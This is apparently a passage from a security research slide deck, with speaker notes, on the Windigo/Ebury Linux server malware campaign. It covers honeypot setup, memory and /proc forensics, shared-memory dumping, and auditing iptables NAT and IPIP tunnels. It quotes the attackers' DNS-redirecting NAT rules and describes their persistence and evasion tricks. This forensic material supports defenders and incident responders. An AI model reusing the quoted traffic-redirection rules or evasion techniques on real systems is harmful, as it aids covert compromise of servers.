<aside class="notes"><div class="ulist"><ul><li><p>nice if the bad guy are greping files</p></li><li><p>harder to grep for interesting stuff</p></li><li><p>findings:</p><div class="ulist"><ul><li><p>recon and deployment is complex, lots of <code>execve</code> calls</p></li><li><p>sshd forked Perl not bash</p></li><li><p>we also intercepted accept calls to get the source address of ssh backdoor
connection</p></li></ul></div></li></ul></div></aside></section>
<section id="_going_out_of_band"><h2>Going out-of-band</h2><div class="olist arabic"><ol class="arabic"><li><p>Built a man-in-the-middle ssh gateway</p></li><li><p>Leaked credentials</p></li><li><p>Waited&#8230;&#8203;</p></li><li><p>&#8230;&#8203;</p></li><li><p>Profit!</p></li></ol></div>
<aside class="notes"><div class="paragraph"><p>We used the venerable mitm-ssh from cmn at signedness.org</p></div></aside></section>
<section id="_as_simple_as_that"><h2>As simple as that</h2><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>/------------ &lt;CLOUD&gt; -------------\

          WAN            DMZ
Internet &lt;---&gt; gateway  &lt;---&gt; Server
              (mitm-ssh)  (some fake
                           workload)
/------------ &lt;/CLOUD&gt; -------------/</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Forwarding a few ports.</p></li><li><p>Simulating a DMZ (which ebury supports)</p></li></ul></div></aside></section>
<section id="_what_we_have_learned"><h2>What we have learned</h2><div class="olist arabic"><ol class="arabic"><li><p>Gather system information with perl script</p></li><li><p>Install Ebury with perl script</p></li><li><p>Monitor infected servers daily with bash script run from the Ebury backdoor</p></li></ol></div>
<aside class="notes"><div class="ulist"><ul><li><p>I have taked about the different components already</p></li></ul></div></aside></section>
<section id="_what_about_production_servers"><h2>What about production servers?</h2><h3>Forensics and incident response</h3><aside class="notes"><div class="paragraph"><p>Where bad guys running reverse proxies</p></div></aside></section>
<section id="_caution" data-background="#125F79"><h2>Caution</h2><div class="ulist step"><ul><li class="fragment"><p>Running at same privilege level</p></li><li class="fragment"><p>It&#8217;s an arm&#8217;s race</p></li><li class="fragment"><p>Aim for out-of-band (network or memory acquisition)</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>right now most of the stuff covered in this section works but there&#8217;s no
guarante they won&#8217;t hook it, LD_PRELOAD it or whatever. They run as root</p></div></aside></section>
<section id="_process_analysis"><h2>Process analysis</h2><h3>Once you&#8217;ve found an interesting process</h3><div class="ulist"><ul><li><p>Dump process memory</p><div class="listingblock oversize2"><div class="content"><pre class="highlight"><code>gcore pid</code></pre></div></div></li><li><p><code>strings -a</code>, <code>gdb</code>, IDA Pro</p></li></ul></div>
<aside class="notes"><div class="ulist"><div class="title">interesting could be</div><ul><li><p>lots of ongoing network transactions (via netstat)</p></li><li><p>deleted from filesystem but running</p></li></ul></div>
<div class="ulist"><div class="title">findings</div><ul><li><p>extract configuration from memory</p></li></ul></div></aside></section>
<section id="_did_you_know"><h2>Did you know?</h2><div class="paragraph"><p><code>proc</code> allows you to extract deleted executables</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code># normal
$ sudo ls -l /proc/17902/exe
lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
\- /home/olivier/src/nginx-1.5.3/nginx
$ sha1sum /home/olivier/src/nginx-1.5.3/nginx
fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  /home/olivier/src/nginx-1.5.3/nginx

$ sudo rm /home/olivier/src/nginx-1.5.3/nginx

# removed
$ sudo ls -l /proc/17902/exe
lrwxrwxrwx 1 root root 0 Sep 26 13:11 /proc/17902/exe -&gt; \
\- /home/olivier/src/nginx-1.5.3/nginx (deleted)

$ sudo cp /proc/17902/exe ./nginx
$ sha1sum nginx
fbb493f83e67a651ccbbf73a5ad22ca6719c19e4  nginx</code></pre></div></div>
<aside class="notes"><div class="ulist"><div class="title">findings</div><ul><li><p>extracted nginx binary</p></li><li><p>extracted config from memory</p></li><li><p>restarted nginx with weakened SSL cipher suite in order to mitm</p></li></ul></div></aside></section>
<section id="_finding_network_level_modifications"><h2>Finding network level modifications</h2><h3>Audit your iptables NAT table rules</h3><div class="listingblock oversize3"><div class="content"><pre class="highlight"><code>iptables -t nat -L -nv</code></pre></div></div>
<div class="listingblock oversize3"><div class="content"><pre class="highlight"><code>iptables-save</code></pre></div></div></section>
<section id="_finding_network_level_modifications_2"><h2>Finding network level modifications</h2><h3>Audit your iptables NAT table rules</h3><div class="ulist"><ul><li><p>Rules in the NAT table to bounce traffic of compromised servers</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>-A PREROUTING -d xx.xx.51.14/32 -p udp -m udp --dport 53 -j DNAT --to-destination xxx.xx.225.200:53
-A POSTROUTING -d xxx.xx.225.200/32 -p udp -m udp --dport 53 -j SNAT --to-source xx.xx.51.14</code></pre></div></div>
<aside class="notes"><div class="paragraph"><p>Sometimes rules aren&#8217;t persistent</p></div></aside></section>
<section id="_finding_network_level_modifications_3"><h2>Finding network level modifications</h2><h3>Audit your IP in IP tunnels</h3><div class="ulist"><ul><li><p><code>ifconfig</code> and look for: <code>Link encap:IPIP Tunnel</code></p></li><li><p><code>ip tunnel show</code></p><div class="listingblock"><div class="content"><pre class="highlight"><code class="nohighlight language-nohighlight">tunl0: ip/ip  remote any  local any  ttl inherit  nopmtudisc
tun10: ip/ip  remote xx.xx.201.34  local xxx.xxx.232.18  dev eth0  ttl inherit
sit0: ipv6/ip  remote any  local any  ttl 64  nopmtudisc</code></pre></div></div></li><li><p><code>ip route show</code></p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>10.12.12.0/30 dev tun10  proto kernel  scope link  src 10.12.12.2</code></pre></div></div>
<div class="ulist"><ul><li><p><code>iptables -t nat -L -nv</code></p><div class="ulist"><ul><li><p>post-routing source NAT to map tunnel traffic to <code>eth0</code> IP</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="paragraph"><p>Sneakier but only because we are not used to look there</p></div></aside></section>
<section id="_shared_memory_analysis"><h2>Shared Memory Analysis</h2><h3><code>shm</code>: POSIX Shared Memory (an IPC mechanism)</h3><div class="ulist"><ul><li><p><code>ipcs</code></p></li><li><p><code>shmcat</code>, <a href="http://sourceforge.net/projects/shmcat/" class="bare">http://sourceforge.net/projects/shmcat/</a></p></li></ul></div></section>
<section id="_shared_memory_analysis_2"><h2>Shared Memory Analysis</h2><h3>Dump Shared Segment</h3><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash"># ipcs -m
------ Shared Memory Segments --------
key        shmid      owner     perms      bytes     nattch
[...]
0x000010e0 465272836  root      600        3282312    0

# ipcs -m -p
------ Shared Memory Creator/Last-op PIDs --------
shmid      owner      cpid       lpid
[...]
465272836  root       15029      17377

# ps aux | grep 15029
[...]
root     15029  0.0  0.0  66300  1204 ?        Ss   Jan26   0:00 /usr/sbin/sshd

# shmcat -m 465272836 &gt; shm_dump</code></pre></div></div>
<aside class="notes"><div class="paragraph"><p>Anything created or used by <code>sshd</code> is suspicious.
OpenSSH doesn&#8217;t do such a thing.</p></div>
<div class="ulist"><div class="title">findings</div><ul><li><p>Cdorked configs</p></li><li><p>OpenSSH leaked passwords</p></li><li><p>XOR encrypted structs with a multi-byte key generated per install</p></li></ul></div></aside></section>
<section id="_recap" data-background="#797620"><h2>Recap</h2><div class="ulist"><ul><li><p>Use out-of-band whenever possible</p></li><li><p>Dump processes memory and content of <code>/proc</code> before killing a process</p></li><li><p>Look for network configuration modifications</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>for us</p></li><li><p>we saw so many people getting reinfected</p></li><li><p>ssh keys stored locally and/or 2FA</p></li></ul></div></aside></section>
<section id="_automating_defense"><h2>Automating defense</h2></section>
<section id="_indicators_of_compromise"><h2>Indicators of Compromise</h2><h3>We released so-called IOCs</h3><div class="ulist"><ul><li><p><a href="https://github.com/eset/malware-ioc/tree/master/windigo" class="bare">https://github.com/eset/malware-ioc/tree/master/windigo</a></p></li><li><p><a href="https://www.cert-bund.de/ebury-faq" class="bare">https://www.cert-bund.de/ebury-faq</a></p></li><li><p>[BEST] Contact us: <a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>We stopped updating them because they were worked-around quickly after we
updated them</p></div>
<div class="paragraph"><p>With all these techniques, it&#8217;s not hard to understand why seizing servers
and analyzing disks will not suffice.</p></div></aside></section>
<section id="_arms_race"><h2>Arms race</h2><h3>Shared memory</h3><div class="ulist step"><ul><li class="fragment"><p>Originally, a shared memory with permission 666 (<code>rw-rw-rw-</code>) was present</p></li><li class="fragment"><p>Changed permission to 600 (<code>rw-------</code>)</p></li><li class="fragment"><p>Doesn&#8217;t use shared memory anymore: use Unix socket instead</p></li></ul></div></section>
<section id="_arms_race_2"><h2>Arms race</h2><h3>Infected file</h3><div class="ulist step"><ul><li class="fragment"><p>Modify system&#8217;s <code>ssh</code>, <code>sshd</code> and <code>ssh-add</code></p></li><li class="fragment"><p>Infect a file system library (<code>libkeyutils.so</code>)</p></li><li class="fragment"><p>Drop a new library file (<code>libns2.so</code>), leaving <code>libkeyutils.so</code> size unchanged</p></li><li class="fragment"><p>Change the library name</p></li></ul></div></section>
<section id="_tracking_calfbot_s_spam"><h2>Tracking Calfbot&#8217;s spam</h2><div class="ulist"><ul><li><p>Run a modified "inactive" Perl malware</p></li><li><p><code>TESTSEND</code> command is sent to check if compromised server can send spam</p></li><li><p>Implemented <code>TESTSEND</code> but not <code>SEND</code> command</p></li></ul></div>
<div class="ulist step"><ul><li class="fragment"><p>There&#8217;s no <code>TESTSEND</code> anymore, more difficult to track</p></li></ul></div></section>
<section id="_reaction_example"><h2>Reaction example</h2><div class="paragraph"><p><span class="image"><img src="images/good_job_eset.png" alt="good_job_eset" /></span></p></div>
<div class="paragraph"><p><span class="image"><img src="images/good_job_eset_cropped.png" alt="good_job_eset_cropped" /></span></p></div>
<aside class="notes"><div class="paragraph"><p>One example where they react to our research. Ebury update</p></div></aside></section>
<section id="_mitigation" data-background="#797620"><h2>Mitigation</h2><h3>Use two factor authentication</h3><div class="paragraph"><p>It&#8217;s important on a server.</p></div></section>
<section id="_mitigation_2" data-background="#797620"><h2>Mitigation</h2><h3>Don&#8217;t copy private key if you don&#8217;t have to</h3></section>
<section id="_closing_words"><h2>Closing words</h2><h3>You can help fight this threat!</h3><div class="ulist"><ul><li><p>Spread the word on detection and prevention techniques</p></li><li><p>Help cleaning infected systems</p></li><li><p>Send us anything suspect you find!</p></li></ul></div>
<div class="paragraph"><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></div></section>
<section id="_closing_words_2"><h2>Closing words</h2><h3>You can help fight this threat!</h3><div class="paragraph"><p><span class="image"><img src="images/if_you_see_something.jpg" alt="if_you_see_something" width="60%" /></span></p></div>
<div class="paragraph"><p><em>Original photo: Nick Sherman</em></p></div></section>
<section id="__logout"><h2>:~$ logout</h2><h3>Thanks!</h3><div class="ulist"><ul><li><p>Questions?</p></li><li><p><a href="http://twitter.com/marc_etienne_">@marc_etienne_</a></p></li><li><p><a href="mailto:windigo@eset.sk">windigo@eset.sk</a></p></li></ul></div></section></div></div><script src="reveal.js/lib/js/head.min.js"></script><script src="reveal.js/js/reveal.min.js"></script><script type="text/javascript">// Full list of configuration options available here:
// https://github.com/hakimel/reveal.js#configuration
 Reveal.initialize({

   // Display controls in the bottom right corner
   controls: false,

   // Display a presentation progress bar
   progress: true,

   // Display the page number of the current slide
   slideNumber: true,

   // Push each slide change to the browser history
   history: true,

   // Enable keyboard shortcuts for navigation
   keyboard: true,

   // Enable the slide overview mode
   overview: true,

   // Vertical centering of slides
   center: true,

   // Enables touch navigation on devices with touch input
   touch: true,

   // Loop the presentation
   loop: false,

   // Change the presentation direction to be RTL
   rtl: false,

   // Turns fragments on and off globally
   fragments: true,

   // Flags if the presentation is running in an embedded mode,
   // i.e. contained within a limited portion of the screen
   embedded: false,

   // Number of milliseconds between automatically proceeding to the
   // next slide, disabled when set to 0, this value can be overwritten
   // by using a data-autoslide attribute on your slides
   autoSlide: 0,

   // Stop auto-sliding after user input
   autoSlideStoppable: true,

   // Enable slide navigation via mouse wheel
   mouseWheel: false,

   // Hides the address bar on mobile devices
   hideAddressBar: true,

   // Opens links in an iframe preview overlay
   previewLinks: false,

   // Transition style
   transition: 'none', // default/cube/page/concave/zoom/linear/fade/none

   // Transition speed
   transitionSpeed: 'default', // default/fast/slow

   // Transition style for full page slide backgrounds
   backgroundTransition: 'slide', // default/none/slide/concave/convex/zoom

   // Number of slides away from the current that are visible
   viewDistance: 3,

   // Parallax background image
   parallaxBackgroundImage: '', // e.g. "'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg'"

   // Parallax background size
   parallaxBackgroundSize: '', // CSS syntax, e.g. "2100px 900px"

   // Optional libraries used to extend on reveal.js
   dependencies: [
       { src: 'reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
       { src: 'reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
       { src: 'reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
       { src: 'reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
       { src: 'reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
       { src: 'reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
   ]
 });</script></body></html>